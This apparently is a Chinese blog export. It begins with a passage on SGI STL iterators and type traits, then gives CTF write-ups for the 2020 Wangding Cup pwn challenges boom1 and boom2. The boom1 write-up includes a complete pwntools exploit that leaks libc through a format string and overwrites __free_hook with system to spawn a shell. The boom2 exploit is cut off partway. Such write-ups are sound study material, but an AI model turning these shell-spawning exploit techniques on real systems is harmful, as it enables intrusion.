class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">Distance</span>&gt; <span class="title">struct</span> <span class="title">random_access_iterator</span> &#123;</span></span><br><span class="line">    <span class="keyword">typedef</span> random_access_iterator_tag iterator_category;</span><br><span class="line">    <span class="keyword">typedef</span> _Tp                        value_type;</span><br><span class="line">    <span class="keyword">typedef</span> _Distance                  difference_type;</span><br><span class="line">    <span class="keyword">typedef</span> _Tp* pointer;</span><br><span class="line">    <span class="keyword">typedef</span> _Tp&amp; reference;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>迭代器中的<code>iterator_category</code>和<code>value_type</code>等等，它们只是类型名。那么迭代器是如何将这些信息返回给调用者呢？<br>
实际上，SGI STL灵活的使用了模板参数推导的特性来完成这些任务，例如如下代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// iterator_category</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">Distance</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">inline</span> <span class="title">input_iterator_tag</span></span></span><br><span class="line"><span class="class"><span class="title">iterator_category</span>(<span class="title">const</span> <span class="title">input_iterator</span>&lt;_Tp, _Distance&gt;&amp;)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">return</span> input_iterator_tag();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> output_iterator_tag <span class="title">iterator_category</span><span class="params">(<span class="keyword">const</span> output_iterator&amp;)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> output_iterator_tag();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __ITERATOR_CATEGORY(__i) iterator_category(__i)</span></span><br><span class="line"><span class="comment">// value_type</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">Distance</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">inline</span> _<span class="title">Tp</span>* <span class="title">value_type</span>(<span class="title">const</span> <span class="title">bidirectional_iterator</span>&lt;_Tp, _Distance&gt;&amp;)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">return</span> (_Tp*)(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">Distance</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">inline</span> _<span class="title">Tp</span>* <span class="title">value_type</span>(<span class="title">const</span> <span class="title">random_access_iterator</span>&lt;_Tp, _Distance&gt;&amp;)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">return</span> (_Tp*)(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __VALUE_TYPE(__i)        value_type(__i)</span></span><br></pre></td></tr></table></figure>
<p>当不同类型的指针使用宏定义<code>__VALUE_TYPE</code>时，由于模板参数推导的特点，程序会调用参数类型相匹配的函数。既然参数类型匹配，那么返回的也一定是匹配的类型。</p>
</li>
<li>
<p><code>Traits</code>技术（重中之重）</p>
<ol>
<li><code>iterator_traits</code>
<ul>
<li>
<p>iterator_traits 技术用于萃取出iterator的对应类型，例如<code>value_type</code>、<code>iterator_category</code>等等。<br>
iterator本身便可以使用对应宏定义(例如<code>__VALUE_TYPE</code>)来取出对应类型。但原生指针并没有这些方法，所以需要套一层<code>iterator_traits</code>，让<code>iterator_traits</code>“帮助”原生指针，将所需的相关信息返回给调用者。</p>
</li>
<li>
<p><code>iterator_traits</code>相关源码</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Iterator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">iterator_traits</span> &#123;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">typename</span> _Iterator::iterator_category iterator_category;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">typename</span> _Iterator::value_type        value_type;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">typename</span> _Iterator::difference_type   difference_type;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">typename</span> _Iterator::pointer           pointer;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">typename</span> _Iterator::reference         reference;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">iterator_traits</span>&lt;_Tp*&gt; &#123;</span></span><br><span class="line"><span class="keyword">typedef</span> random_access_iterator_tag iterator_category;</span><br><span class="line"><span class="keyword">typedef</span> _Tp                         value_type;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">ptrdiff_t</span>                   difference_type;</span><br><span class="line"><span class="keyword">typedef</span> _Tp*                        pointer;</span><br><span class="line"><span class="keyword">typedef</span> _Tp&amp;                        reference;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到，<code>iterator_traits</code>对待iterator和原生指针的方式，是不一样的。</p>
</li>
</ul>
</li>
<li><code>type_traits</code>
<ul>
<li>
<p><code>iterator_traits</code>技术只能用来规范迭代器，对于迭代器之外的东西没有加以规范。所以<code>type_traits</code>就应运而生。</p>
</li>
<li>
<p><code>iterator_traits</code>是萃取迭代器的特性，而<code>__type_traits</code>是萃取型别的特性。<br>
<code>__type_traits</code>有如下几个类型</p>
<ol>
<li><code>has_trivial_default_constructor</code> —— 是否使用默认构造函数</li>
<li><code>has_trivial_copy_constructor</code> —— 是否使用默认拷贝构造函数</li>
<li><code>has_trivial_assignment_operator</code> —— 是否使用默认赋值运算符</li>
<li><code>has_trivial_destructor</code> —— 是否使用默认析构函数</li>
<li><code>is_POD_type</code> —— 是否是<code>POD</code>类型<br>
返回的是<code>__true_type</code>或<code>__false_type</code>结构</li>
</ol>
</li>
<li>
<p>其相关源码如下</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">true_type</span> &#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">false_type</span> &#123;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">struct</span> __<span class="title">type_traits</span> &#123;</span></span><br><span class="line">    <span class="keyword">typedef</span> __true_type     this_dummy_member_must_be_first;</span><br><span class="line">                    <span class="comment">/* Do not remove this member. It informs a compiler which</span></span><br><span class="line"><span class="comment">                        automatically specializes __type_traits that this</span></span><br><span class="line"><span class="comment">                        __type_traits template is special. It just makes sure that</span></span><br><span class="line"><span class="comment">                        things work if an implementation is using a template</span></span><br><span class="line"><span class="comment">                        called __type_traits for something unrelated. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following restrictions should be observed for the sake of</span></span><br><span class="line"><span class="comment">        compilers which automatically produce type specific specializations</span></span><br><span class="line"><span class="comment">        of this class:</span></span><br><span class="line"><span class="comment">            - You may reorder the members below if you wish</span></span><br><span class="line"><span class="comment">            - You may remove any of the members below if you wish</span></span><br><span class="line"><span class="comment">            - You must not rename members without making the corresponding</span></span><br><span class="line"><span class="comment">                name change in the compiler</span></span><br><span class="line"><span class="comment">            - Members you add will be treated like regular members unless</span></span><br><span class="line"><span class="comment">                you add the appropriate support in the compiler. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> __false_type    has_trivial_default_constructor;</span><br><span class="line">    <span class="keyword">typedef</span> __false_type    has_trivial_copy_constructor;</span><br><span class="line">    <span class="keyword">typedef</span> __false_type    has_trivial_assignment_operator;</span><br><span class="line">    <span class="keyword">typedef</span> __false_type    has_trivial_destructor;</span><br><span class="line">    <span class="keyword">typedef</span> __false_type    is_POD_type;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">__STL_TEMPLATE_NULL <span class="class"><span class="keyword">struct</span> __<span class="title">type_traits</span>&lt;int&gt; &#123;</span></span><br><span class="line">    <span class="keyword">typedef</span> __true_type    has_trivial_default_constructor;</span><br><span class="line">    <span class="keyword">typedef</span> __true_type    has_trivial_copy_constructor;</span><br><span class="line">    <span class="keyword">typedef</span> __true_type    has_trivial_assignment_operator;</span><br><span class="line">    <span class="keyword">typedef</span> __true_type    has_trivial_destructor;</span><br><span class="line">    <span class="keyword">typedef</span> __true_type    is_POD_type;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
</li>
<li>
<p>应用</p>
<ul>
<li>
<p>为什么迭代器要分这么多的类型呢？原因是为了实现STL速度与效率的提高。<br>
根据迭代器的类型，算法可以对该种类的迭代器使用效率最高的操作方式。<br>
例如，如果对char*类型的iterator执行copy操作，那么copy函数就可以直接使用memcpy来完成操作，而不是遍历复制再构造。如此以提高算法的效率。<br>
请看如下源码：</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;_Tp, _Alloc&gt;::_M_insert_aux(iterator __position, <span class="keyword">const</span> _Tp&amp; __x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* ....  */</span></span><br><span class="line">    __STL_TRY&#123;</span><br><span class="line">        <span class="comment">// 当vector的成员函数调用 uninitialized_copy 时，程序会根据迭代器类型执行特定的 uninitialized_copy操作</span></span><br><span class="line">        __new_finish = uninitialized_copy(_M_start, __position, __new_start);</span><br><span class="line">        construct(__new_finish, __x);</span><br><span class="line">        ++__new_finish;</span><br><span class="line">        __new_finish = uninitialized_copy(__position, _M_finish, __new_finish);</span><br><span class="line">    &#125; __STL_UNWIND((destroy(__new_start, __new_finish),</span><br><span class="line">            _M_deallocate(__new_start, __len)));</span><br><span class="line">    <span class="comment">/* ....  */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果是char*类型的迭代器就直接调用memmove。如果不是，则调用使用迭代器的uninitialized_copy函数</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">InputIter</span>, <span class="title">class</span> _<span class="title">ForwardIter</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">inline</span> _<span class="title">ForwardIter</span></span></span><br><span class="line"><span class="class"><span class="title">uninitialized_copy</span>(_<span class="title">InputIter</span> __<span class="title">first</span>, _<span class="title">InputIter</span> __<span class="title">last</span>,</span></span><br><span class="line"><span class="class">    _<span class="title">ForwardIter</span> __<span class="title">result</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">return</span> __uninitialized_copy(__first, __last, __result,</span><br><span class="line">        <span class="comment">// 注意到这里获取了迭代器所指向对象的类型</span></span><br><span class="line">        __VALUE_TYPE(__result));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果迭代器是一个指向某个对象的指针，则调用内含_Tp*类型参数的__uninitialized_copy</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">InputIter</span>, <span class="title">class</span> _<span class="title">ForwardIter</span>, <span class="title">class</span> _<span class="title">Tp</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">inline</span> _<span class="title">ForwardIter</span></span></span><br><span class="line"><span class="class">__<span class="title">uninitialized_copy</span>(_<span class="title">InputIter</span> __<span class="title">first</span>, _<span class="title">InputIter</span> __<span class="title">last</span>,</span></span><br><span class="line"><span class="class">                    _<span class="title">ForwardIter</span> __<span class="title">result</span>, _<span class="title">Tp</span>*)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">// 注意这里获取了迭代器所指对象的is_POD信息</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> __type_traits&lt;_Tp&gt;::is_POD_type _Is_POD;</span><br><span class="line">    <span class="keyword">return</span> __uninitialized_copy_aux(__first, __last, __result, _Is_POD());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果这个对象类型是POD的，直接copy以提高效率</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">InputIter</span>, <span class="title">class</span> _<span class="title">ForwardIter</span>&gt;`</span></span><br><span class="line"><span class="class"><span class="title">inline</span> _<span class="title">ForwardIter</span></span></span><br><span class="line"><span class="class">__<span class="title">uninitialized_copy_aux</span>(_<span class="title">InputIter</span> __<span class="title">first</span>, _<span class="title">InputIter</span> __<span class="title">last</span>,</span></span><br><span class="line"><span class="class">                        _<span class="title">ForwardIter</span> __<span class="title">result</span>,</span></span><br><span class="line"><span class="class">                        __<span class="title">true_type</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">return</span> copy(__first, __last, __result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 否则，只能一个个的遍历并执行构造函数</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">InputIter</span>, <span class="title">class</span> _<span class="title">ForwardIter</span>&gt;</span></span><br><span class="line"><span class="class">_<span class="title">ForwardIter</span></span></span><br><span class="line"><span class="class">__<span class="title">uninitialized_copy_aux</span>(_<span class="title">InputIter</span> __<span class="title">first</span>, _<span class="title">InputIter</span> __<span class="title">last</span>,</span></span><br><span class="line"><span class="class">                        _<span class="title">ForwardIter</span> __<span class="title">result</span>,</span></span><br><span class="line"><span class="class">                        __<span class="title">false_type</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _ForwardIter __cur = __result;</span><br><span class="line">    __STL_TRY &#123;</span><br><span class="line">        <span class="keyword">for</span> ( ; __first != __last; ++__first, ++__cur)</span><br><span class="line">        _Construct(&amp;*__cur, *__first);</span><br><span class="line">        <span class="keyword">return</span> __cur;</span><br><span class="line">    &#125;</span><br><span class="line">    __STL_UNWIND(_Destroy(__result, __cur));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="c-容器">c. 容器</h3>
<ol>
<li>vector
<ul>
<li>vector的本质就是一个空间连续数组。与普通数组不同的是，该数组&quot;可长可短&quot;。</li>
<li>vector的核心成员是三个迭代器，分别为
<ol>
<li><code>_Tp* _M_start</code> —— 指向所分配数组的起始位置</li>
<li><code>_Tp* _M_finish</code> —— 指向已使用空间的末端位置+1</li>
<li><code>_Tp* _M_end_of_storage</code> —— 指向所分配数组的末尾位置+1</li>
</ol>
</li>
</ul>
</li>
<li>list
<ul>
<li>list是一个头尾相连的双向环状链表，由一个个节点头尾相连所构成。</li>
<li>其关键的成员只有一个，<code>_List_node&lt;_Tp&gt;* _M_node</code> —— 指向链表的末尾节点，该节点的成员<code>_M_next</code>指向的是链表的起始节点。</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>STL</tag>
      </tags>
  </entry>
  <entry>
    <title>2020网鼎杯部分Pwn题解</title>
    <url>/2020/05/2020wdbctf/</url>
    <content><![CDATA[<blockquote>
<p>此处将会收录笔者力所能及的题解。<br>
超出笔者技术水平的题目（例如kernel exploit）以及笔者因各种因素无法接触的题（例如bind pwn）将不会被收录。</p>
</blockquote>
<h2 id="1-青龙组">1.青龙组</h2>
<h3 id="1-boom1">1. boom1</h3>
<p>点击<a href="/2020/05/2020wdbctf/boom1" title="这里">这里</a>下载文件</p>
<h4 id="1-易知信息">1) 易知信息</h4>
<ul>
<li>保护全开</li>
<li>ELF文件中rodata段上有大量字符串。将其中部分字符串百度一下（例如： <code>duplicate global definition</code>）便可得知，该程序为C语言解释器</li>
<li>在程序main函数中，发现一串疑似可用的关键字/函数名。<br>
<img src="/2020/05/2020wdbctf/boom1_KeyChars.png" alt="img"></li>
</ul>
<a id="more"></a>
<ul>
<li>IDA反编译后，在main函数后半段中，发现所有函数只能执行一次，没办法直接ORW flag<br>
<img src="/2020/05/2020wdbctf/boom1_FuncOnce.png" alt="img"></li>
</ul>
<blockquote>
<p>说了这么多，其实和解法一点关系也没有 T_T</p>
</blockquote>
<h4 id="2-分析">2) 分析</h4>
<ol>
<li>
<p>我们需要先泄露出libc的版本来。 先在printf处下断点，然后计算__libc_start_main_ret的相对偏移量<br>
然后用printf格式化字符串漏洞来泄露__libc_start_main_ret的地址。之后就可以查询libc-database，得到libc的版本</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 21个 "%p "</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>泄露__libc_start_main_ret地址（单击图片可放大）<br>
<img src="/2020/05/2020wdbctf/boom1_LeakLibc_start_main_ret.png" alt="img"></li>
<li>泄露远程libc版本<br>
<img src="/2020/05/2020wdbctf/boom1_LeakLibcVersion.png" alt="img"></li>
</ul>
</li>
<li>
<p>在得到libc版本后，<strong>一定要先打patch!!!</strong>。当程序使用不同libc时，其内存布局也会不一样，会发生改变，所以一定要先打patch。</p>
<blockquote>
<p>一个可能的原因是，程序被装载时，其内存布局可能是由libc上关于ELF的代码所设置的。<br>
不同libc的相关代码可能不一样</p>
</blockquote>
</li>
<li>
<p>因为 mmap 分配的内存与 libc 之前存在固定的偏移，因此可以推算出 libc 的基地址</p>
<blockquote>
<p>尚未查明原因。不过ASLR的实现可能也是基于mmap函数的分配机制</p>
</blockquote>
<p>先在程序退出处下断点，然后把本地变量地址输出。并在vmmap里找寻libc的基地址。两者相减便可得到相对偏移</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/2020wdbctf/boom1_Vmmap.png" alt="img"></p>
</li>
<li>
<p>在得到了libc版本和基地址后，只要将libc中<code>__free_hook</code>改为<code>system</code>函数的起始地址，然后再<code>free(&quot;/bin/sh&quot;)</code>即可get shell.</p>
<blockquote>
<p><strong>注意！</strong></p>
</blockquote>
<blockquote>
<ol>
<li>变量a不可声明为char,原因是char类型变量只会修改一个字节，这无异于杯水车薪。</li>
<li>下面的C语言exp中，变量a的类型为int, 则&amp;a是int* 的值，故&amp;a + 1 == (int)&amp;a + 8。<br>
所以变量a与__free_hook的相对偏移需要除以sizeof(int)。<br>
如果您仍然迷惑，请查阅C语言指针运算相关知识。</li>
</ol>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a;</span><br><span class="line">  *(&amp;a + (<span class="number">-1459952</span> / <span class="keyword">sizeof</span>(<span class="keyword">int</span>))) = (<span class="keyword">int</span>)&amp;a + (<span class="number">-5254040</span>);</span><br><span class="line">  <span class="built_in">free</span>(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="3-半自动EXP">3) 半自动EXP</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        io = remote(<span class="string">"node3.buuoj.cn"</span>, sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">'./boom1'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(io, script=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(io, script)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakLibcVersion</span><span class="params">()</span>:</span></span><br><span class="line">    io = connect()</span><br><span class="line">    debug(io, <span class="string">"b * $rebase(0x4CDD)\nc"</span>)</span><br><span class="line">    code = <span class="string">'''</span></span><br><span class="line"><span class="string">        int main()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            printf("'''</span> + <span class="string">"%p "</span> * <span class="number">21</span> + <span class="string">'''");</span></span><br><span class="line"><span class="string">            return 0;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">    io.sendlineafter(<span class="string">"I'm living...\n"</span>, code.replace(<span class="string">'\n'</span>, <span class="string">''</span>))</span><br><span class="line">    log.info(io.recv())</span><br><span class="line">    <span class="comment"># 将得到的__libc_start_main_ret地址填入，得到libc版本</span></span><br><span class="line">    obj = LibcSearcher(<span class="string">'__libc_start_main_ret'</span>, <span class="number">0x7f2e710b8b97</span>)</span><br><span class="line">    obj.dump(<span class="string">"__libc_start_main_ret"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakOffset</span><span class="params">()</span>:</span></span><br><span class="line">    io = process(<span class="string">'./boom1'</span>)</span><br><span class="line">    code = <span class="string">'''</span></span><br><span class="line"><span class="string">        int main()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            int a;</span></span><br><span class="line"><span class="string">            printf("%p\\n", &amp;a);</span></span><br><span class="line"><span class="string">            return 0;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">    <span class="comment"># 下断点后vmmap查看libc基地址</span></span><br><span class="line">    debug(io, <span class="string">"b * $rebase(0x4e17)"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"I'm living..."</span>, code.replace(<span class="string">'\n'</span>, <span class="string">''</span>))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getShell</span><span class="params">(libc, libc_offset)</span>:</span></span><br><span class="line">    io = connect()</span><br><span class="line">    free_hook_offset = libc_offset + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    system_offset = libc_offset + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"free_hook addr: "</span> + hex(free_hook_offset ))</span><br><span class="line">    log.info(<span class="string">"system addr: "</span> + hex(system_offset))</span><br><span class="line"></span><br><span class="line">    code = <span class="string">'''</span></span><br><span class="line"><span class="string">        int main()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            int a;</span></span><br><span class="line"><span class="string">            *(&amp;a + (</span></span><br><span class="line"><span class="string">            '''</span> + str(free_hook_offset) + <span class="string">'''</span></span><br><span class="line"><span class="string">             / sizeof(int))) = (int)&amp;a + (</span></span><br><span class="line"><span class="string">            '''</span> + str(system_offset) + <span class="string">'''</span></span><br><span class="line"><span class="string">            );</span></span><br><span class="line"><span class="string">            free("/bin/sh");</span></span><br><span class="line"><span class="string">            return 0;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">    debug(io, <span class="string">"b * $rebase(0x4e17)\nb * $rebase(0x4C04)"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"I'm living..."</span>, code.replace(<span class="string">'\n'</span>, <span class="string">''</span>).replace(<span class="string">"  "</span>, <span class="string">""</span>))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># 第一步，泄露libc版本，以及free和system函数相对libc基地址的偏移量</span></span><br><span class="line">    <span class="comment"># leakLibcVersion()</span></span><br><span class="line">    <span class="comment"># 泄露出libc 版本后，打上patch</span></span><br><span class="line">    libc = ELF(<span class="string">"/mylibs/2.27-3ubuntu1_amd64/libc-2.27.so"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二步，泄露VM的本地变量地址，并查找本地变量与libc基地址之间的相对偏移量</span></span><br><span class="line">    <span class="comment"># leakOffset()</span></span><br><span class="line">    <span class="comment"># 通过动态调试，确定与libc基地址的偏移量</span></span><br><span class="line">      <span class="comment"># libc base addr - local vals addr</span></span><br><span class="line">    libc_offset = <span class="number">0x7f8b1ae8f000</span> - <span class="number">0x7f8b1b3e0fd8</span></span><br><span class="line">    <span class="comment"># 第三步，修改free_hook为system的函数地址，然后free("/bin/sh")即可</span></span><br><span class="line">    getShell(libc, libc_offset)</span><br></pre></td></tr></table></figure>
<h3 id="2-boom2">2. boom2</h3>
<p>点击<a href="/2020/05/2020wdbctf/boom2" title="这里">这里</a>下载文件</p>
<h4 id="1-易知信息-2">1) 易知信息</h4>
<ul>
<li>保护全开</li>
<li>和boom1类似，这题是VMpwn</li>
</ul>
<h4 id="2-分析-2">2) 分析</h4>
<ul>
<li>
<p>VMpwn有几个共性</p>
<ol>
<li><strong>大量分支</strong><br>
话不多说，看图<br>
<img src="/2020/05/2020wdbctf/boom2_idabranches.png" alt="img"></li>
<li><code>3/4个寄存器</code>
<ol>
<li><code>IP</code>，用于指向下条指令的指针</li>
<li><code>SP</code>，指向虚拟栈的栈顶</li>
<li><code>AX</code>，用于存放运算结果的变量</li>
<li><code>BP</code>（如果有的话），用于指向虚拟栈中某些位置，以便于运算时使用<br>
<img src="/2020/05/2020wdbctf/boom2_vmFeature.png" alt="img"></li>
</ol>
</li>
</ol>
</li>
<li>
<p>该程序可执行 <strong>压栈</strong>、<strong>弹栈</strong>、<strong>+-*/%等运算</strong>、<strong>指针解引用</strong> 等，还支持对 <strong>指令立即数</strong> 的相关操作。</p>
</li>
<li>
<p>动态调试发现，初始时虚拟栈上存有栈上<code>environ</code>的地址<br>
<img src="/2020/05/2020wdbctf/boom2_vmStack.png" alt="img"></p>
</li>
<li>
<p>所以我们可以通过修改虚拟栈上存放的<code>environ</code>地址，将其减去某个偏移，得到<code>__libc_start_main_ret</code>所在的栈地址。进而在<code>__libc_start_main_ret</code>的栈地址处写入one_gadget。待main函数返回时get shell.</p>
<blockquote>
<p>one_gadget的地址可通过对<code>__libc_start_main_ret</code>值的运算得到</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>这题的libc必须沿用上一题boom1的libc。这题没有回显，无法泄露远程libc版本，但又必须使用one_gadget</p>
</blockquote>
<ul>
<li>剩下的分析将会在EXP里以注释的形式呈现，便于理解</li>
</ul>
<h4 id="3-EXP">3) EXP</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ELFname = <span class="string">"./boom2"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    io = remote(<span class="string">"node3.buuoj.cn"</span>, sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(ELFname)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(msg = <span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(io, msg)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈上 __libc_start_main_ret与 environ 的相对偏移</span></span><br><span class="line">stack_offset = 